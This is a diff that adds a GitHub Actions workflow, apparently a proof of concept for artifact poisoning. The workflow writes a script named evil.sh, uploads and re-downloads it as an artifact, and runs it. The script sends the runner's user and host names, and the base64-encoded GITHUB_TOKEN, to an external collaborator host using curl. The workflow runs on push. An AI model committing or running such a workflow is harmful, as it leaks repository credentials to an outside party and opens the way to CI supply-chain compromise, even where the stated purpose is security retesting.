@@ -1,0 +1,36 @@
+name: PoC Artifact Poisoning Retest (550a30a2)
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-550a30a2-retest.yml'
+jobs:
+  poison-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-malicious-artifact
+        run: |
+          mkdir -p /tmp/payload
+          cat > /tmp/payload/evil.sh << 'SCRIPTEOF'
+          #!/bin/bash
+          echo "EVIL SCRIPT EXECUTED"
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ARTIFACT-POISON-RETEST-$(whoami | base64 -w0).$(hostname | base64 -w0)"
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ARTIFACT-POISON-TOKEN=" < <(echo -n "$GITHUB_TOKEN" | base64 -w0)
+          SCRIPTEOF
+          chmod +x /tmp/payload/evil.sh
+      - name: upload-artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-poison-retest-550a30a2
+          path: /tmp/payload/
+      - name: download-and-execute
+        uses: actions/download-artifact@v4
+        with:
+          name: poc-poison-retest-550a30a2
+          path: /tmp/downloaded
+      - name: execute-poisoned-artifact
+        run: |
+          echo "Downloaded files:"
+          find /tmp/downloaded -type f -exec ls -la {} \;
+          if [ -f /tmp/downloaded/evil.sh ]; then
+            bash /tmp/downloaded/evil.sh
+          fi
